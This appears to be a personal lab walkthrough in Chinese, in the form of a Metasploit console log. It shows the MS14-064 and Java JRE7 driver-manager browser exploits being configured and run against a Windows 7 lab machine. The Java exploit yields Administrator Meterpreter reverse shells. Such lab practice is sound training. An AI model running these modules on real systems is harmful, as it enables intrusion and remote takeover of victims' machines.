@@ -1,0 +1,532 @@
+jre7u17 在win7或者xp上有整个bug
+
+在靶机器安装好java7
+windows/browser/ms14_064_ole_code_execution
+payload用windows/meterpreter/reverse_tcp
+
+AllowPowershellPrompt打开
+TRYUAC打开
+
+┌──(root💀tyza66)-[~]
+└─# msfdb run
+[i] Database already started
+Metasploit tip: Use help <command> to learn more about any command
+                                                  
+
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMM                MMMMMMMMMM
+MMMN$                           vMMMM
+MMMNl  MMMMM             MMMMM  JMMMM
+MMMNl  MMMMMMMN       NMMMMMMM  JMMMM
+MMMNl  MMMMMMMMMNmmmNMMMMMMMMM  JMMMM
+MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
+MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
+MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
+MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
+MMMNI  MMMNM   MMMMMMM   MMMMM  jMMMM
+MMMNI  WMMMM   MMMMMMM   MMMM#  JMMMM
+MMMMR  ?MMNM             MMMMM .dMMMM
+MMMMNm `?MMM             MMMM` dMMMMM
+MMMMMMN  ?MM             MM?  NMMMMMN
+MMMMMMMMNe                 JMMMMMNMMM
+MMMMMMMMMMNm,            eMMMMMNMMNMM
+MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM
+MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM
+        https://metasploit.com
+
+
+       =[ metasploit v6.4.9-dev                           ]
++ -- --=[ 2420 exploits - 1248 auxiliary - 423 post       ]
++ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > use windows/browser/ms14_064_ole_code_execution
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/browser/ms14_064_ole_code_execution) > options
+
+Module options (exploit/windows/browser/ms14_064_ole_code_execution):
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   AllowPowershellP  false            yes       Allow exploit to try Powersh
+   rompt                                        ell
+   Retries           true             no        Allow the browser to retry t
+                                                he module
+   SRVHOST           0.0.0.0          yes       The local host or network in
+                                                terface to listen on. This m
+                                                ust be an address on the loc
+                                                al machine or 0.0.0.0 to lis
+                                                ten on all addresses.
+   SRVPORT           8080             yes       The local port to listen on.
+   SSL               false            no        Negotiate SSL for incoming c
+                                                onnections
+   SSLCert                            no        Path to a custom SSL certifi
+                                                cate (default is randomly ge
+                                                nerated)
+   TRYUAC            false            yes       Ask victim to start as Admin
+                                                istrator
+   URIPATH                            no        The URI to use for this expl
+                                                oit (default is random)
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, t
+                                        hread, process, none)
+   LHOST     198.18.0.1       yes       The listen address (an interface may
+                                         be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows XP
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/browser/ms14_064_ole_code_execution) > set LHOST 192.168.100.53
+LHOST => 192.168.100.53
+msf6 exploit(windows/browser/ms14_064_ole_code_execution) > SET TARGET
+[-] Unknown command: SET. Did you mean set? Run the help command for more details.
+msf6 exploit(windows/browser/ms14_064_ole_code_execution) > set target
+target => 
+msf6 exploit(windows/browser/ms14_064_ole_code_execution) > options
+
+Module options (exploit/windows/browser/ms14_064_ole_code_execution):
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   AllowPowershellP  false            yes       Allow exploit to try Powersh
+   rompt                                        ell
+   Retries           true             no        Allow the browser to retry t
+                                                he module
+   SRVHOST           0.0.0.0          yes       The local host or network in
+                                                terface to listen on. This m
+                                                ust be an address on the loc
+                                                al machine or 0.0.0.0 to lis
+                                                ten on all addresses.
+   SRVPORT           8080             yes       The local port to listen on.
+   SSL               false            no        Negotiate SSL for incoming c
+                                                onnections
+   SSLCert                            no        Path to a custom SSL certifi
+                                                cate (default is randomly ge
+                                                nerated)
+   TRYUAC            false            yes       Ask victim to start as Admin
+                                                istrator
+   URIPATH                            no        The URI to use for this expl
+                                                oit (default is random)
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, t
+                                        hread, process, none)
+   LHOST     192.168.100.53   yes       The listen address (an interface may
+                                         be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows XP
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/browser/ms14_064_ole_code_execution) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf6 exploit(windows/browser/ms14_064_ole_code_execution) > set AllowPowershellPrompt true
+AllowPowershellPrompt => true
+msf6 exploit(windows/browser/ms14_064_ole_code_execution) > set TRYUAC true
+TRYUAC => true
+msf6 exploit(windows/browser/ms14_064_ole_code_execution) > show targets
+
+Exploit targets:
+=================
+
+    Id  Name
+    --  ----
+=>  0   Windows XP
+    1   Windows 7
+
+
+msf6 exploit(windows/browser/ms14_064_ole_code_execution) > set target 1
+target => 1
+msf6 exploit(windows/browser/ms14_064_ole_code_execution) > set LHOST 192.168.101.53
+LHOST => 192.168.101.53
+msf6 exploit(windows/browser/ms14_064_ole_code_execution) > set SRVHOST 192.168.101.53
+SRVHOST => 192.168.101.53
+msf6 exploit(windows/browser/ms14_064_ole_code_execution) > run
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 192.168.101.53:4444 
+msf6 exploit(windows/browser/ms14_064_ole_code_execution) > [*] Using URL: http://192.168.101.53:8080/aZoGz8zifRAH
+[*] Server started.
+[*] 192.168.101.113  ms14_064_ole_code_execution - Gathering target information for 192.168.101.113
+[*] 192.168.101.113  ms14_064_ole_code_execution - Sending HTML response to 192.168.101.113
+[!] 192.168.101.113  ms14_064_ole_code_execution - Exploit requirement(s) not met: ua_ver. For more info: http://r-7.co/PVbcgx
+[!] 192.168.101.113  ms14_064_ole_code_execution - Exploit requirement(s) not met: ua_ver. For more info: http://r-7.co/PVbcgx
+[!] 192.168.101.113  ms14_064_ole_code_execution - Exploit requirement(s) not met: ua_ver. For more info: http://r-7.co/PVbcgx
+[!] 192.168.101.113  ms14_064_ole_code_execution - Exploit requirement(s) not met: ua_ver. For more info: http://r-7.co/PVbcgx
+[!] 192.168.101.113  ms14_064_ole_code_execution - Exploit requirement(s) not met: ua_ver. For more info: http://r-7.co/PVbcgx
+Interrupt: use the 'exit' command to quit
+msf6 exploit(windows/browser/ms14_064_ole_code_execution) > run
+[*] Exploit running as background job 1.
+[*] Exploit completed, but no session was created.
+
+[-] Handler failed to bind to 192.168.101.53:4444:-  -
+[-] Handler failed to bind to 0.0.0.0:4444:-  -
+[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:4444).
+msf6 exploit(windows/browser/ms14_064_ole_code_execution) > jobs
+
+Jobs
+====
+
+  Id  Name                    Payload                 Payload opts
+  --  ----                    -------                 ------------
+  0   Exploit: windows/brows  windows/meterpreter/re  tcp://192.168.101.53:4
+      er/ms14_064_ole_code_e  verse_tcp               444
+      xecution
+
+msf6 exploit(windows/browser/ms14_064_ole_code_execution) > jobs -K
+Stopping all jobs...
+
+[*] Server stopped.
+msf6 exploit(windows/browser/ms14_064_ole_code_execution) > sesions
+[-] Unknown command: sesions. Did you mean sessions? Run the help command for more details.
+msf6 exploit(windows/browser/ms14_064_ole_code_execution) > sessions
+
+Active sessions
+===============
+
+No active sessions.
+
+msf6 exploit(windows/browser/ms14_064_ole_code_execution) > run -j
+[*] Exploit running as background job 2.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 192.168.101.53:4444 
+msf6 exploit(windows/browser/ms14_064_ole_code_execution) > [*] Using URL: http://192.168.101.53:8080/1jz6wy1BOS
+[*] Server started.
+
+msf6 exploit(windows/browser/ms14_064_ole_code_execution) > jobs
+
+Jobs
+====
+
+  Id  Name                    Payload                 Payload opts
+  --  ----                    -------                 ------------
+  2   Exploit: windows/brows  windows/meterpreter/re  tcp://192.168.101.53:4
+      er/ms14_064_ole_code_e  verse_tcp               444
+      xecution
+
+msf6 exploit(windows/browser/ms14_064_ole_code_execution) > 
+[*] 192.168.101.113  ms14_064_ole_code_execution - Gathering target information for 192.168.101.113
+[*] 192.168.101.113  ms14_064_ole_code_execution - Sending HTML response to 192.168.101.113
+[!] 192.168.101.113  ms14_064_ole_code_execution - Exploit requirement(s) not met: ua_ver. For more info: http://r-7.co/PVbcgx
+[!] 192.168.101.113  ms14_064_ole_code_execution - Exploit requirement(s) not met: ua_ver. For more info: http://r-7.co/PVbcgx
+[!] 192.168.101.113  ms14_064_ole_code_execution - Exploit requirement(s) not met: ua_ver. For more info: http://r-7.co/PVbcgx
+[!] 192.168.101.113  ms14_064_ole_code_execution - Exploit requirement(s) not met: ua_ver. For more info: http://r-7.co/PVbcgx
+[!] 192.168.101.113  ms14_064_ole_code_execution - Exploit requirement(s) not met: ua_ver. For more info: http://r-7.co/PVbcgx
+
+msf6 exploit(windows/browser/ms14_064_ole_code_execution) > 
+[!] 192.168.101.113  ms14_064_ole_code_execution - Exploit requirement(s) not met: ua_ver. For more info: http://r-7.co/PVbcgx
+[!] 192.168.101.113  ms14_064_ole_code_execution - Exploit requirement(s) not met: ua_ver. For more info: http://r-7.co/PVbcgx
+[!] 192.168.101.113  ms14_064_ole_code_execution - Exploit requirement(s) not met: ua_ver. For more info: http://r-7.co/PVbcgx
+
+不行啊
+
+然后还有一个可以用的
+exploit/multi/browser/java_jre17_driver_manager
+
+┌──(root💀tyza66)-[~]
+└─# msfdb run
+[i] Database already started
+Metasploit tip: Search can apply complex filters such as search cve:2009 
+type:exploit, see all the filters with help search
+                                                  
+     ,           ,
+    /             \                                                           
+   ((__---,,,---__))                                                          
+      (_) O O (_)_________                                                    
+         \ _ /            |\                                                  
+          o_o \   M S F   | \                                                 
+               \   _____  |  *                                                
+                |||   WW|||                                                   
+                |||     |||                                                   
+                                                                              
+
+       =[ metasploit v6.4.9-dev                           ]
++ -- --=[ 2420 exploits - 1248 auxiliary - 423 post       ]
++ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > use exploit/multi/browser/java_jre17_driver_manager
+[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
+msf6 exploit(multi/browser/java_jre17_driver_manager) > show  options
+
+Module options (exploit/multi/browser/java_jre17_driver_manager):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface t
+                                       o listen on. This must be an address
+                                       on the local machine or 0.0.0.0 to li
+                                       sten on all addresses.
+   SRVPORT  8080             yes       The local port to listen on.
+   SSL      false            no        Negotiate SSL for incoming connection
+                                       s
+   SSLCert                   no        Path to a custom SSL certificate (def
+                                       ault is randomly generated)
+   URIPATH                   no        The URI to use for this exploit (defa
+                                       ult is random)
+
+
+Payload options (java/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  198.18.0.1       yes       The listen address (an interface may be
+                                      specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Generic (Java Payload)
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/browser/java_jre17_driver_manager) > show payload
+[-] Invalid parameter "payload", use "show -h" for more information
+msf6 exploit(multi/browser/java_jre17_driver_manager) > show payloads
+
+Compatible Payloads
+===================
+
+   #   Name                                        Disclosure Date  Rank    Check  Description
+   -   ----                                        ---------------  ----    -----  -----------
+   0   payload/cmd/unix/bind_aws_instance_connect  .                normal  No     Unix SSH Shell, Bind Instance Connect (via AWS API)
+   1   payload/generic/custom                      .                normal  No     Custom Payload
+   2   payload/generic/shell_bind_aws_ssm          .                normal  No     Command Shell, Bind SSM (via AWS API)
+   3   payload/generic/shell_bind_tcp              .                normal  No     Generic Command Shell, Bind TCP Inline
+   4   payload/generic/shell_reverse_tcp           .                normal  No     Generic Command Shell, Reverse TCP Inline
+   5   payload/generic/ssh/interact                .                normal  No     Interact with Established SSH Connection
+   6   payload/java/jsp_shell_bind_tcp             .                normal  No     Java JSP Command Shell, Bind TCP Inline
+   7   payload/java/jsp_shell_reverse_tcp          .                normal  No     Java JSP Command Shell, Reverse TCP Inline
+   8   payload/java/meterpreter/bind_tcp           .                normal  No     Java Meterpreter, Java Bind TCP Stager
+   9   payload/java/meterpreter/reverse_http       .                normal  No     Java Meterpreter, Java Reverse HTTP Stager
+   10  payload/java/meterpreter/reverse_https      .                normal  No     Java Meterpreter, Java Reverse HTTPS Stager
+   11  payload/java/meterpreter/reverse_tcp        .                normal  No     Java Meterpreter, Java Reverse TCP Stager
+   12  payload/java/shell/bind_tcp                 .                normal  No     Command Shell, Java Bind TCP Stager
+   13  payload/java/shell/reverse_tcp              .                normal  No     Command Shell, Java Reverse TCP Stager
+   14  payload/java/shell_reverse_tcp              .                normal  No     Java Command Shell, Reverse TCP Inline
+   15  payload/multi/meterpreter/reverse_http      .                normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTP Stager (Multiple Architectures)
+   16  payload/multi/meterpreter/reverse_https     .                normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTPS Stager (Multiple Architectures)
+
+msf6 exploit(multi/browser/java_jre17_driver_manager) > set LHOST 192.168.101.53
+LHOST => 192.168.101.53
+msf6 exploit(multi/browser/java_jre17_driver_manager) > use payload java/meterpreter/reverse_http
+
+Matching Modules
+================
+
+   #  Name                                    Disclosure Date  Rank    Check  Description
+   -  ----                                    ---------------  ----    -----  -----------
+   0  payload/java/meterpreter/reverse_http   .                normal  No     Java Meterpreter, Java Reverse HTTP Stager
+   1  payload/java/meterpreter/reverse_https  .                normal  No     Java Meterpreter, Java Reverse HTTPS Stager
+
+
+Interact with a module by name or index. For example info 1, use 1 or use payload/java/meterpreter/reverse_https                                            
+
+msf6 exploit(multi/browser/java_jre17_driver_manager) > use 0
+msf6 payload(java/meterpreter/reverse_http) > use multi/browser/java_jre17_driver_manager
+[*] Using configured payload java/meterpreter/reverse_tcp
+msf6 exploit(multi/browser/java_jre17_driver_manager) > set LHOST 192.168.101.53
+LHOST => 192.168.101.53
+msf6 exploit(multi/browser/java_jre17_driver_manager) > RUN
+[-] Unknown command: RUN. Did you mean run? Run the help command for more details.
+msf6 exploit(multi/browser/java_jre17_driver_manager) > run
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+msf6 exploit(multi/browser/java_jre17_driver_manager) > 
+[*] Started reverse TCP handler on 192.168.101.53:4444 
+[*] Using URL: http://192.168.101.53:8080/5zoutxzi3
+[*] Server started.
+[*] 192.168.101.113  java_jre17_driver_manager - handling request for /5zoutxzi3
+[*] 192.168.101.113  java_jre17_driver_manager - handling request for /5zoutxzi3/
+[*] 192.168.101.113  java_jre17_driver_manager - handling request for /5zoutxzi3/ANZqXClC.jar
+[*] 192.168.101.113  java_jre17_driver_manager - handling request for /5zoutxzi3/ANZqXClC.jar
+[*] 192.168.101.113  java_jre17_driver_manager - handling request for /5zoutxzi3/org.class
+[*] 192.168.101.113  java_jre17_driver_manager - handling request for /5zoutxzi3/
+[*] 192.168.101.113  java_jre17_driver_manager - handling request for /5zoutxzi3/com.class
+[*] 192.168.101.113  java_jre17_driver_manager - handling request for /5zoutxzi3/
+[*] 192.168.101.113  java_jre17_driver_manager - handling request for /5zoutxzi3/edu.class
+[*] 192.168.101.113  java_jre17_driver_manager - handling request for /5zoutxzi3/
+[*] 192.168.101.113  java_jre17_driver_manager - handling request for /5zoutxzi3/net.class
+[*] 192.168.101.113  java_jre17_driver_manager - handling request for /5zoutxzi3/
+[*] Sending stage (57971 bytes) to 192.168.101.113
+[*] Meterpreter session 1 opened (192.168.101.53:4444 -> 192.168.101.113:49385) at 2025-02-19 18:46:26 +0800
+ls
+[*] exec: ls
+
+ 3d.apk
+ 9a5ba575.0
+ 公共
+ 模板
+ 视频
+ 图片
+ 文档
+ 下载
+ 音乐
+ 桌面
+ aircrack_8812au
+ all-2.0.tar.gz
+ AntSword-Loader-v4.0.3-linux-x64
+ AntSword-Loader-v4.0.3-linux-x64.zip
+ antSword-master
+ antSword-master.zip
+ bao.jar
+ beacon.bin
+ cacert.der
+ cacert.pem
+'Clash for Windows-0.20.39-x64-linux'
+ Clash.for.Windows-0.20.39-x64-linux.tar.gz
+ CobaltStrike4.3
+ CobaltStrike4.3.zip
+ CVE-2018-8174_EXP-master
+ CVE-2018-8174_EXP-master.zip
+ Desktop
+ Evil-Droid-master
+ go
+ JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar
+ master
+ Nessus-10.1.2-debian6_amd64.deb
+ payload.py
+ payload.txt
+ phuip-fpizdam-master
+ phuip-fpizdam-master.zip
+ xuegod.jar
+msf6 exploit(multi/browser/java_jre17_driver_manager) > options
+
+Module options (exploit/multi/browser/java_jre17_driver_manager):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface t
+                                       o listen on. This must be an address
+                                       on the local machine or 0.0.0.0 to li
+                                       sten on all addresses.
+   SRVPORT  8080             yes       The local port to listen on.
+   SSL      false            no        Negotiate SSL for incoming connection
+                                       s
+   SSLCert                   no        Path to a custom SSL certificate (def
+                                       ault is randomly generated)
+   URIPATH                   no        The URI to use for this exploit (defa
+                                       ult is random)
+
+
+Payload options (java/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.101.53   yes       The listen address (an interface may be
+                                      specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Generic (Java Payload)
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/browser/java_jre17_driver_manager) > run
+[*] Exploit running as background job 1.
+[*] Exploit completed, but no session was created.
+
+[-] Handler failed to bind to 192.168.101.53:4444:-  -
+[-] Handler failed to bind to 0.0.0.0:4444:-  -
+[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:4444).
+msf6 exploit(multi/browser/java_jre17_driver_manager) > jobs -k
+[-] Please specify valid job identifier(s)
+msf6 exploit(multi/browser/java_jre17_driver_manager) > jobs -K
+Stopping all jobs...
+
+[*] Server stopped.
+msf6 exploit(multi/browser/java_jre17_driver_manager) > run
+[*] Exploit running as background job 2.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 192.168.101.53:4444 
+msf6 exploit(multi/browser/java_jre17_driver_manager) > [*] Using URL: http://192.168.101.53:8080/pW3GJSe2zhZo
+[*] Server started.
+[*] 192.168.101.113  java_jre17_driver_manager - handling request for /pW3GJSe2zhZo
+[*] 192.168.101.113  java_jre17_driver_manager - handling request for /pW3GJSe2zhZo/
+[*] 192.168.101.113  java_jre17_driver_manager - handling request for /pW3GJSe2zhZo/sZYZjRma.jar
+[*] 192.168.101.113  java_jre17_driver_manager - handling request for /pW3GJSe2zhZo/sZYZjRma.jar
+[*] Sending stage (57971 bytes) to 192.168.101.113
+[*] 192.168.101.113  java_jre17_driver_manager - handling request for /pW3GJSe2zhZo/
+[*] Meterpreter session 2 opened (192.168.101.53:4444 -> 192.168.101.113:49393) at 2025-02-19 18:47:58 +0800
+[*] 192.168.101.113  java_jre17_driver_manager - handling request for /pW3GJSe2zhZo/PnVmkBXQ.jnlp
+[*] 192.168.101.113  java_jre17_driver_manager - handling request for /pW3GJSe2zhZo/QyuUPxjA.jar
+[*] Sending stage (57971 bytes) to 192.168.101.113
+[*] Meterpreter session 3 opened (192.168.101.53:4444 -> 192.168.101.113:49407) at 2025-02-19 18:48:25 +0800
+
+msf6 exploit(multi/browser/java_jre17_driver_manager) > sesions
+[-] Unknown command: sesions. Did you mean sessions? Run the help command for more details.
+msf6 exploit(multi/browser/java_jre17_driver_manager) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                  Information           Connection
+  --  ----  ----                  -----------           ----------
+  1         meterpreter java/win  Administrator @ WIN-  192.168.101.53:4444
+            dows                  VGN1T1S6687           -> 192.168.101.113:4
+                                                        9385 (192.168.101.11
+                                                        3)
+  2         meterpreter java/win  Administrator @ WIN-  192.168.101.53:4444
+            dows                  VGN1T1S6687           -> 192.168.101.113:4
+                                                        9393 (192.168.101.11
+                                                        3)
+  3         meterpreter java/win  Administrator @ WIN-  192.168.101.53:4444
+            dows                  VGN1T1S6687           -> 192.168.101.113:4
+                                                        9407 (192.168.101.11
+                                                        3)
+
+可以看到已经拿到反弹shell了
+msf6 exploit(multi/browser/java_jre17_driver_manager) > sessions -i 3
+[*] Starting interaction with 3...
+
+meterpreter > whoami
+[-] Unknown command: whoami. Run the help command for more details.
+meterpreter > getuid
+Server username: Administrator
+meterpreter > 
+
+这时win7上起来的小窗口可以关了
